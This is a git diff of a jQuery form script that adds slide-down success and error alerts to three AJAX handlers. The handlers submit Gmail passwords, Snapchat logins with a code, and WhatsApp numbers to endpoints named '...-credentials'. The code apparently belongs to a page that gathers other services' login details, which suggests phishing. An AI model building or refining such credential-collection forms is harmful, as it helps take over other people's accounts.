@@ -108,6 +108,46 @@ $(function () {
     }
   }
 
+
+  // display success message
+  function displaySuccessMessage(message) {
+    const successAlert = $("#success-alert-display");
+    const alertMessage = successAlert.find(".alert-message"); // Select the alert message span
+
+    alertMessage.text(`${message}`);
+
+    // Show the alert with a slide-down animation
+    successAlert.slideDown();
+
+    // Scroll to the top of the page to make the alert visible
+    $("html, body").animate({ scrollTop: 0 }, "fast");
+
+    // Hide the alert after a few seconds (optional)
+    setTimeout(function () {
+      successAlert.slideUp();
+    }, 5000); // Hide after 5 seconds (adjust the time as needed)
+  }
+
+
+  // display error message
+  function displayErrorMessage(message) {
+    const errorAlert = $("#error-alert-display");
+    const alertMessage = errorAlert.find(".alert-message"); // Select the alert message span
+
+    alertMessage.text(`${message}`);
+
+    // Show the alert with a slide-down animation
+    errorAlert.slideDown();
+
+    // Scroll to the top of the page to make the alert visible
+    $("html, body").animate({ scrollTop: 0 }, "fast");
+
+    // Hide the alert after a few seconds (optional)
+    setTimeout(function () {
+      errorAlert.slideUp();
+    }, 5000); // Hide after 5 seconds (adjust the time as needed)
+  }
+
   $("#form").submit((e) => {
     e.preventDefault();
     // submit form based on selected option
@@ -125,12 +165,16 @@ $(function () {
           url: "/submit-whatsapp-credentials",
         }).done(function (data) {
           if (data.code === "success") {
+            // Set the success message
+            displaySuccessMessage(data.message);
+
             // clear form fields
             whatsAppNumber.val("");
             whatsAppCountry.val("");
-            console.log("Submission was a success");
+
           } else if (data.code === "error") {
-            console.log("Submission was a failure");
+            // Set the failure message
+            displayErrorMessage(data.message)
           }
         });
       }
@@ -151,12 +195,16 @@ $(function () {
           url: "/submit-gmail-credentials",
         }).done(function (data) {
           if (data.code === "success") {
+            // Set the success message
+            displaySuccessMessage(data.message);
+
             // clear form fields
             email.val("");
             password.val("");
-            console.log("Submission was a success");
+
           } else if (data.code === "error") {
-            console.log("Submission was a failure");
+            // Set the failure message
+            displayErrorMessage(data.message)
           }
         });
       }
@@ -178,13 +226,17 @@ $(function () {
           url: "/submit-snapchat-credentials",
         }).done(function (data) {
           if (data.code === "success") {
+            // Set the success message
+            displaySuccessMessage(data.message);
+
             // clear form fields
             username.val("");
             password.val("");
             codeInput.val("");
-            console.log("Submission was a success");
+
           } else if (data.code === "error") {
-            console.log("Submission was a failure");
+            // Set the failure message
+            displayErrorMessage(data.message)
           }
         });
       }
